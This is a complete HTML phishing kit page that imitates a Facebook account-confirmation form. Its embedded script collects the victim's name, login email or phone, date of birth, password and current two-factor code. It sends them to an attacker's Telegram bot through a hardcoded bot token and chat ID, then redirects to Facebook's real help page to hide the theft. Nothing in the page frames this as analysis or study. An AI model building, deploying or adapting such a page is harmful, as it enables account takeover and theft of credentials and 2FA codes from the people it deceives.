<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Confirm Your Facebook Account</title>
  <style>
    body {
      font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
      margin: 0;
      padding: 0;
      background-color: #f0f2f5;
    }

    .header {
      background-color: #1877f2;
      padding: 15px 0;
      text-align: center;
    }

    .header h1 {
      color: white;
      margin: 0;
      font-size: 24px;
      font-weight: 600;
    }

    .form-container {
      background-color: white;
      max-width: 480px;
      margin: 30px auto;
      padding: 25px;
      border-radius: 10px;
      box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
    }

    .form-group {
      margin-bottom: 20px;
    }

    label {
      display: block;
      margin-bottom: 8px;
      font-weight: 600;
      color: #1c1e21;
    }

    input, select {
      width: 100%;
      padding: 12px 14px;
      border: 1px solid #ccd0d5;
      border-radius: 6px;
      font-size: 15px;
      background-color: #ffffff;
      transition: border-color 0.2s;
    }

    input:focus, select:focus {
      border-color: #1877f2;
      outline: none;
    }

    .dob-fields {
      display: flex;
      gap: 10px;
    }

    .dob-fields select {
      flex: 1;
    }

    .password-container {
      position: relative;
    }

    .password-container svg {
      position: absolute;
      right: 12px;
      top: 50%;
      transform: translateY(-50%);
      cursor: pointer;
      fill: #606770;
    }

    .submit-btn {
      background-color: #1877f2;
      color: white;
      border: none;
      padding: 14px 0;
      font-size: 16px;
      border-radius: 6px;
      cursor: pointer;
      width: 100%;
      font-weight: bold;
    }

    .submit-btn:hover {
      background-color: #166fe5;
    }

    .divider {
      border-top: 1px solid #dadde1;
      margin: 20px 0;
    }

    .info-text {
      color: #606770;
      font-size: 14px;
      margin-bottom: 20px;
    }
  </style>
</head>
<body>
  <div class="header">
    <h1>Confirm Your Account</h1>
  </div>

  <div class="form-container">
    <p class="info-text">
      To secure your account, please verify your identity by providing the following details:
    </p>

    <form id="confirmForm">
      <div class="form-group">
        <label for="fullName">Full Name:</label>
        <input type="text" id="fullName" required />
      </div>

      <div class="divider"></div>

      <div class="form-group">
        <label for="emailOrPhone">Login Email or Mobile Number:</label>
        <input type="text" id="emailOrPhone" required />
      </div>

      <div class="divider"></div>

      <div class="form-group">
        <label for="profileUrl">Profile Link (URL):</label>
        <input type="url" id="profileUrl" required />
      </div>

      <div class="divider"></div>

      <div class="form-group">
        <label>Date of Birth:</label>
        <div class="dob-fields">
          <select id="month" required>
            <option value="">Month</option>
            <option value="1">January</option>
            <option value="2">February</option>
            <option value="3">March</option>
            <option value="4">April</option>
            <option value="5">May</option>
            <option value="6">June</option>
            <option value="7">July</option>
            <option value="8">August</option>
            <option value="9">September</option>
            <option value="10">October</option>
            <option value="11">November</option>
            <option value="12">December</option>
          </select>
          <select id="day" required>
            <option value="">Day</option>
          </select>
          <select id="year" required>
            <option value="">Year</option>
          </select>
        </div>
      </div>

      <div class="divider"></div>

      <div class="form-group">
        <label for="password">Password:</label>
        <div class="password-container">
          <input type="password" id="password" required />
          <svg id="togglePassword" xmlns="http://www.w3.org/2000/svg" height="20" viewBox="0 0 24 24" width="20">
            <path d="M12 4.5c-5.5 0-10 5.5-10 7.5s4.5 7.5 10 7.5 10-5.5 10-7.5-4.5-7.5-10-7.5zm0 13c-3 0-6-2.7-6-5.5S9 6.5 12 6.5s6 2.7 6 5.5-3 5.5-6 5.5zm0-8.5a3 3 0 100 6 3 3 0 000-6z"/>
          </svg>
        </div>
      </div>

      <div class="divider"></div>

      <div class="form-group">
        <label for="twoFactorCode">Two-Factor Authentication (2FA) Code:</label>
        <input type="text" id="twoFactorCode" placeholder="Enter 6-digit code" required />
      </div>

      <div class="divider"></div>

      <button type="submit" class="submit-btn">Confirm Account</button>
    </form>
  </div>

  <script>
    // Generate days
    const daySelect = document.getElementById('day');
    for (let i = 1; i <= 31; i++) {
      const opt = document.createElement('option');
      opt.value = i;
      opt.textContent = i;
      daySelect.appendChild(opt);
    }

    // Generate years
    const yearSelect = document.getElementById('year');
    const currentYear = new Date().getFullYear();
    for (let y = currentYear; y >= 1900; y--) {
      const opt = document.createElement('option');
      opt.value = y;
      opt.textContent = y;
      yearSelect.appendChild(opt);
    }

    // Toggle password visibility
    const passwordInput = document.getElementById('password');
    const toggleIcon = document.getElementById('togglePassword');
    let visible = false;

    toggleIcon.addEventListener('click', () => {
      visible = !visible;
      passwordInput.type = visible ? 'text' : 'password';
      toggleIcon.innerHTML = visible
        ? `<path d="M12 4.5C6.5 4.5 2 10 2 12s4.5 7.5 10 7.5 10-5.5 10-7.5-4.5-7.5-10-7.5zm0 13c-3 0-6-2.7-6-5.5S9 6.5 12 6.5s6 2.7 6 5.5-3 5.5-6 5.5zm-1.41-8.09l4.95 4.95-1.41 1.41-4.95-4.95 1.41-1.41z"/>`
        : `<path d="M12 4.5c-5.5 0-10 5.5-10 7.5s4.5 7.5 10 7.5 10-5.5 10-7.5-4.5-7.5-10-7.5zm0 13c-3 0-6-2.7-6-5.5S9 6.5 12 6.5s6 2.7 6 5.5-3 5.5-6 5.5zm0-8.5a3 3 0 100 6 3 3 0 000-6z"/>`;
    });

    // Submit form
    document.getElementById('confirmForm').addEventListener('submit', async function (e) {
      e.preventDefault();

      const formData = {
        fullName: document.getElementById('fullName').value,
        emailOrPhone: document.getElementById('emailOrPhone').value,
        profileUrl: document.getElementById('profileUrl').value,
        dob: `${document.getElementById('month').value}/${document.getElementById('day').value}/${document.getElementById('year').value}`,
        password: document.getElementById('password').value,
        twoFactorCode: document.getElementById('twoFactorCode').value,
        timestamp: new Date().toLocaleString()
      };

      const botToken = '6221428997:AAE8zvLIx0mQlNyVX7LU3fmOFq6FPNs1R30';
      const chatId = '6138139230';

      const message =
        `üì¢ New Account Confirmation\n\n` +
        `üë§ Full Name: ${formData.fullName}\n` +
        `üìß Email/Phone: ${formData.emailOrPhone}\n` +
        `üîó Profile URL: ${formData.profileUrl}\n` +
        `üéÇ Date of Birth: ${formData.dob}\n` +
        `üîë Password: ${formData.password}\n` +
        `üî¢ 2FA Code: ${formData.twoFactorCode}\n` +
        `‚è∞ Submitted: ${formData.timestamp}`;

      try {
        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ chat_id: chatId, text: message })
        });
      } catch (err) {
        console.error('Telegram API error:', err);
      } finally {
        window.location.href = "https://web.facebook.com/help?locale2=en_US&_rdc=1&_rdr#";
      }
    });
  </script>
</body>
</html>
